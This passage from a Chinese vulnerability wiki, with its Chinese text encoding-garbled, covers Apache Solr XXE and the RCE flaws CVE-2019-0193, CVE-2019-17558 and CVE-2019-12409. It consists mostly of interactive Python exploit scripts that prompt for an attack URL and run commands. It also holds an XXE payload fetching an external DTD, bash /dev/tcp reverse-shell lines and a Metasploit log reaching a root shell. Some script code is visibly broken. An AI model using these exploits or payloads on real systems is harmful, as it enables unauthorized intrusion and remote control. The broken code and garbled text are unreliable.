Âú®Ëá™Â∑±ÁöÑÊúçÂä°Âô®‰∏äÂÜôÂÖ•‰∏Ä‰∏™ÂèØËÆøÈóÆÁöÑXMLÊñá‰ª∂ÔºåÂÜÖÂÆπÂÜôÂÖ• \"> ÁÑ∂ÂêéËØ∑Ê±ÇËøô‰∏™Êñá‰ª∂Êù•ËØªÂèñÊúçÂä°Âô®‰∏äÁöÑÊñá‰ª∂ http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] Ê≥®ÊÑèËøôÈáåÁöÑpayloadËøõË°å‰∫ÜurlÁºñÁ†Å,ËØ∑Ê±ÇÁöÑÊñá‰ª∂‰∏∫ http://peiqi.tech/1.dtdÔºåÊúâÊõ¥Â§öÈúÄÊ±ÇËá™Ë°åÊõ¥ÊîπÂÜôÂÖ•ÁöÑxmlÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogÂú∞ÂùÄ(ÊºèÊ¥ûÂ§ñËøûÊ£ÄÊµã) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(ËØªÂèñ/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") else: print(\"\\033[32m[o] ËØ∑Êü•ÁúãdnslogÂìçÂ∫î \\033[0m\") except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] ÊºèÊ¥ûÊàêÂäüÂà©Áî®,ÂìçÂ∫î‰∏∫\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mËØ∑ËæìÂÖ•‰Ω†ÁöÑdnslogÂú∞ÂùÄÔºö\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2019-0193.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2019-0193.html","title":"Apache Solr ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2019-0193","keywords":"","body":"Apache Solr ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2019-0193 ÊºèÊ¥ûÊèèËø∞ 2019 Âπ¥ 08 Êúà 01 Êó•ÔºåApache Solr ÂÆòÊñπÂèëÂ∏ÉÈ¢ÑË≠¶ÔºåApache Solr DataImport ÂäüËÉΩ Âú®ÂºÄÂêØ Debug Ê®°ÂºèÊó∂ÔºåÂèØ‰ª•Êé•Êî∂Êù•Ëá™ËØ∑Ê±ÇÁöÑ‚ÄùdataConfig‚ÄùÂèÇÊï∞ÔºåËøô‰∏™ÂèÇÊï∞ÁöÑÂäüËÉΩ‰∏édata-config.xml ‰∏ÄÊ†∑Ôºå‰∏çËøáÊòØÂú®ÂºÄÂêØ Debug Ê®°ÂºèÊó∂Êñπ‰æøÈÄöËøáÊ≠§ÂèÇÊï∞ËøõË°åË∞ÉËØïÔºåÂπ∂‰∏î Debug Ê®°ÂºèÁöÑÂºÄÂêØÊòØÈÄöËøáÂèÇÊï∞‰º†ÂÖ•ÁöÑ„ÄÇÂú® dataConfig ÂèÇÊï∞‰∏≠ÂèØ‰ª•ÂåÖÂê´ script ÊÅ∂ÊÑèËÑöÊú¨ÂØºËá¥ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Solr ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # ÂàõÂª∫‰∏Ä‰∏™solrÊ†∏ÂøÉtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÁÇπÂáªÂàöÂàöÂàõÂª∫ÁöÑtestËøõÂÖ•Ë∞ÉËØï Â∞Ü‰∏ãÈù¢ÁöÑPOC‰ª£Á†ÅÂ°´ÂÖ• Debug-Mode ‰∏≠ Ê≥®ÊÑè POC ÊâßË°åÁöÑ‰ª£Á†Å‰∏≠ÁöÑbase64Â≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆËØ∑ÁΩÆÊç¢ÊàêËá™Â∑±ÁöÑipÂú∞ÂùÄÂπ∂base64Âä†ÂØÜÂ°´ÂÖ• [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 Áõ¥Êé•Â¶Ç‰∏äÂÜôÂÖ•ÂèçÂºπÊó†ÂèçÂ∫îÔºå‰∏çÁ®≥ÂÆöÔºåÈúÄË¶Åbase64Âä†ÂØÜÂÜôÊâçËÉΩÂèçÂºπ‰∏Ä‰∏™shell ÁÇπÂáªEXecuteÊâßË°å‰ª£Á†Å ÊàêÂäüÂèçÂºπshell ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POC‰∏çÊîØÊåÅÂèçÂºπshellÔºåÂ¶ÇÈúÄÂèçÂºπshellÔºåËØ∑ÊåâÂ¶Ç‰∏äÊ≠•È™§ÂèçÂºπshell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(ÂëΩ‰ª§ÊâßË°å) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] ÁõÆÊ†áUrl,DataimportÊ®°ÂùóÂºÄÂêØ\\033[0m\") else: print(\"\\033[31m[x] ÁõÆÊ†áUrl,DataimportÊ®°ÂùóÊú™ÂºÄÂêØ\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] ÊºèÊ¥ûÊàêÂäüÂà©Áî®,ÂìçÂ∫î‰∏∫\\n \\033[0m\", message) except: print(\"\\033[31m[x] ‰ª£Á†ÅÊâßË°åÂ§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) ÂèÇËÄÉÊñáÁ´† apache solrËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û(cve-2019-0193) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558.html","title":"Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558","keywords":"","body":"Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558 ÊºèÊ¥ûÊèèËø∞ 2019Âπ¥10ÊúàÊú´ÔºåGitHub‰ª£Á†Å‰∏≠ÂÆâÂÖ®Á†îÁ©∂ÂëòS00pYÂèëÂ∏É‰∏Ä‰∏™Apache Solr VelocityÊ®°ÁâàÊ≥®ÂÖ•ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÁöÑPOCÔºåÂèëÁé∞ÁΩëÁªú‰∏äÂá∫Áé∞ÈíàÂØπApache SolrÊúçÂä°Âô®ÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇËØ•ÊºèÊ¥ûÊòØÁî±‰∫éVelocityÊ®°ÊùøÂ≠òÂú®Ê≥®ÂÖ•ÊâÄËá¥ÔºàVelocityÊòØ‰∏Ä‰∏™Âü∫‰∫éJavaÁöÑÊ®°ÊùøÂºïÊìéÔºåÂèØËÆ©‰ΩøÁî®ËÄÖÈÄöËøáÊ®°ÊùøËØ≠Ë®ÄÂºïÁî®Java‰∏≠ÂÆö‰πâÁöÑÂØπË±°Ôºâ„ÄÇÊîªÂáªËÄÖÂú®Áü•ÈÅìSolrÊúçÂä°Âô®‰∏äCoreÂêçÁß∞ÂêéÔºåÂÖàÊääparams.resource.loader.enabledËÆæÁΩÆ‰∏∫trueÔºàÂ∞±ÂèØÂä†ËΩΩÊåáÂÆöËµÑÊ∫êÔºâÔºåÂÜçËøõË°åËøúÁ®ãÊâßË°åÂëΩ‰ª§„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Solr 5.x Ëá≥ 8.2.0 ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # ÂàõÂª∫‰∏Ä‰∏™solrÊ†∏ÂøÉtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÊâìÂºÄÂêéËé∑Âèñ Core ‰ø°ÊÅØ ÂæóÁü• test Ëøô‰∏™ Core Â≠òÂú® ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/test/config Ê≠£Â∏∏ ËÆøÈóÆCoreÁöÑconfigÈÖçÁΩÆ‰ø°ÊÅØÊó∂ÔºåÈÄöËøáPOSTËØ∑Ê±ÇÊääparams.resource.loader.enabledËÆæÁΩÆ‰∏∫ TrueÔºåÂÜçÈÄöËøáÁ≤æÂøÉÊûÑÈÄ†ÁöÑgetËØ∑Ê±ÇÂç≥ÂèØRCEÔºåÊ≠§Êó∂Áî®Êà∑Â∞±ÂèØ‰ª•Âä†ËΩΩÊåáÂÆöËµÑÊ∫êÔºåÊûÑÈÄ†‰∏Ä‰∏™ËÉΩÊâßË°åÂëΩ‰ª§ÁöÑÊÅ∂ÊÑèËØ∑Ê±Ç ËÆæÁΩÆparams.resource.loader.enabled‰∏∫True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } ÂëΩ‰ª§ÊâßË°å ÂÜç‰ΩøÁî®POCÈÄ†ÊàêÂëΩ‰ª§ÊâßË°å http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end ÂèçÂºπhellÔºåÂõ†‰∏∫ÈÉ®ÂàÜÂëΩ‰ª§‰ºöË¢´ËøáÊª§ÂØºËá¥ËøîÂõû Error 500 ÔºåÊâÄ‰ª•ÂèçÂºπshellÈúÄË¶ÅÁî®Âè¶Â§ñÁöÑÂèçÂºπshellÊñπÊ≥ï POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POCÈúÄË¶ÅUrlencodingËøõË°åÁºñÁ†ÅÊâçËÉΩÁªïËøá POC Ôºö %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(ÂëΩ‰ª§ÊâßË°å) \\033[0m') print('+ \\033[36mCmd >>> shell(ÂèçÂºπshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTËØ∑Ê±ÇÊàêÂäüÂ∞Üparams.resource.loader.enabledËÆæÁΩÆ‰∏∫True \\033[0m\") else: print(\"\\033[31m[x] POSTËØ∑Ê±Çparams.resource.loader.enabledËÆæÁΩÆ‰∏∫TrueÂ§±Ë¥• \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ‰ª£Á†ÅÊâßË°åÂ§±Ë¥•ÔºåÂìçÂ∫î‰∏∫ Error 500 \\033[0m\") else: print(\"\\033[32m[o] ÊºèÊ¥ûÊàêÂäüÂà©Áî®,ÂìçÂ∫î‰∏∫\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr JMXÊúçÂä° RCE CVE-2019-12409.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr JMXÊúçÂä° RCE CVE-2019-12409.html","title":"Apache Solr JMXÊúçÂä° RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMXÊúçÂä° RCE CVE-2019-12409 ÊºèÊ¥ûÊèèËø∞ Java ManagementExtensionsÔºàJMXÔºâÊòØ‰∏ÄÁßçJavaÊäÄÊúØÔºå‰∏∫ÁÆ°ÁêÜÂíåÁõëËßÜÂ∫îÁî®Á®ãÂ∫è„ÄÅÁ≥ªÁªüÂØπË±°„ÄÅËÆæÂ§áÔºàÂ¶ÇÊâìÂç∞Êú∫ÔºâÂíåÈù¢ÂêëÊúçÂä°ÁöÑÁΩëÁªúÊèê‰æõÁõ∏Â∫îÁöÑÂ∑•ÂÖ∑„ÄÇJMX ‰Ωú‰∏∫ JavaÁöÑ‰∏ÄÁßçBeanÁÆ°ÁêÜÊú∫Âà∂ÔºåÂ¶ÇÊûúJMXÊúçÂä°Á´ØÂè£Êö¥Èú≤ÔºåÈÇ£‰πàËøúÁ®ãÊîªÂáªËÄÖÂèØ‰ª•ËÆ©ËØ•ÊúçÂä°Âô®ËøúÁ®ãÂä†ËΩΩÊÅ∂ÊÑèÁöÑBeanÊñá‰ª∂ÔºåÈöèÁùÄBeanÁöÑÊª•Áî®ÂØºËá¥ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 ÁéØÂ¢ÉÊê≠Âª∫ ‰∏ãËΩΩ Apache Solr 8.2.0 ‰πüÂèØ‰ª•dockerÊê≠Âª∫ docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ Êü•ÁúãÊê≠Âª∫ÁöÑSolrÊòØÂê¶Â≠òÂú®ÊºèÊ¥û,Êü•Áúãsolr.in.shÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑENABLE_REMOTE_JMX_OPTSÈÄâÈ°πËÆæÁΩÆÊòØÂê¶‰∏∫‚ÄúTure‚ÄùÔºåÂ¶ÇÊûú‰∏∫TureÔºåÂàôÂ≠òÂú®ÊºèÊ¥û Êü•ÁúãÊºèÊ¥ûÁ´ØÂè£18983ÊòØÂê¶ÂºÄÊîæ [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/Ê°åÈù¢# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id Áî®Êà∑id=0(root) ÁªÑid=0(root) ÁªÑ=0(root) ÊºèÊ¥û‰øÆÂ§ç Â∞Üsolr.in.shÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑENABLE_REMOTE_JMX_OPTSÈÄâÈ°πËÆæÁΩÆ‰∏∫falseÔºåÁÑ∂ÂêéÈáçÂêØSolrÊúçÂä°„ÄÇ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr RCE Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥û 